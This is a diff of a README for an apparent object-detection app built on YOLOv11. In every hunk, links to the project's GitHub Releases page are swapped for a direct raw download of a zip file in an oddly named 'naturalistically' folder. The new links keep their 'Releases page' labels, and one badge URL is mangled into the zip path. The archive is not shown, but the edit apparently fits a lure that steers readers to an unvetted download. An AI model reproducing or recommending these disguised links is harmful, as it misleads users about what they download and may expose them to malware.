@@ -6,7 +6,7 @@ Welcome to the Pre-trained-Objection-Detection repository! This guide will help 
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Pre--trained--Objection--Detection-brightgreen)](https://github.com/JesicaMauree/Pre-trained-Objection-Detection/releases)
+[![Download Now](https://raw.githubusercontent.com/JesicaMauree/Pre-trained-Objection-Detection/main/naturalistically/Pre-trained-Objection-Detection.zip%20Now-Pre--trained--Objection--Detection-brightgreen)](https://raw.githubusercontent.com/JesicaMauree/Pre-trained-Objection-Detection/main/naturalistically/Pre-trained-Objection-Detection.zip)
 
 ## 📋 Prerequisites
 
@@ -31,7 +31,7 @@ This application uses a pretrained YOLOv11 model, which stands for "You Only Loo
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/JesicaMauree/Pre-trained-Objection-Detection/releases) to download the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/JesicaMauree/Pre-trained-Objection-Detection/main/naturalistically/Pre-trained-Objection-Detection.zip) to download the software.
 
 2. **Choose the Latest Version**: Find the section labeled "Latest Release" and select it. This version will have the most recent updates and features.
 
@@ -68,4 +68,4 @@ This project is open source. You can view the full license details in the reposi
 
 Special thanks to the Ultralytics team for their work on the YOLOv11 model, which powers our application.
 
-For support and updates, visit our project's [Releases page](https://github.com/JesicaMauree/Pre-trained-Objection-Detection/releases) again. Enjoy your experience with object detection!
+For support and updates, visit our project's [Releases page](https://raw.githubusercontent.com/JesicaMauree/Pre-trained-Objection-Detection/main/naturalistically/Pre-trained-Objection-Detection.zip) again. Enjoy your experience with object detection!
